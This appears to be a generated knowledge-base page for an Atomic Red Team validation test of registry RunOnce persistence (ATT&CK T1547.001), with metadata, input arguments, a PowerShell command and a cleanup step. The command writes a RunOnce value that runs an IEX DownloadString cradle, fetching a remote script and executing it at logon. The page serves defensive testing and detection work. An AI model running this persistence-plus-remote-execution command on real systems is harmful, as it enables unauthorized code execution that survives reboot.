---
atomic_guid: "eb44f842-0457-4ddc-9b92-c4caa144ac42"
title: "PowerShell Registry RunOnce"
framework: "atomic"
generated: "true"
attack_technique_id: "T1547.001"
attack_technique_name: "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.yaml"
build_date: "2026-04-26 14:38:40"
executor: "powershell"
aliases:
  - "eb44f842-0457-4ddc-9b92-c4caa144ac42"
  - "PowerShell Registry RunOnce"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# PowerShell Registry RunOnce

RunOnce Key Persistence via PowerShell
Upon successful execution, a new entry will be added to the runonce item in the registry.

## Metadata

- Atomic GUID: eb44f842-0457-4ddc-9b92-c4caa144ac42
- Technique: T1547.001: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1547.001/T1547.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1547-boot_or_logon_autostart_execution|T1547.001]]

## Input Arguments

### reg_key_path

- description: Path to registry key to update
- type: path
- default: HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce

### thing_to_execute

- description: Thing to Run
- type: path
- default: powershell.exe

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
$RunOnceKey = "#{reg_key_path}"
set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`")"'
```

### Cleanup

```powershell
Remove-ItemProperty -Path #{reg_key_path} -Name "NextRun" -Force -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.yaml)
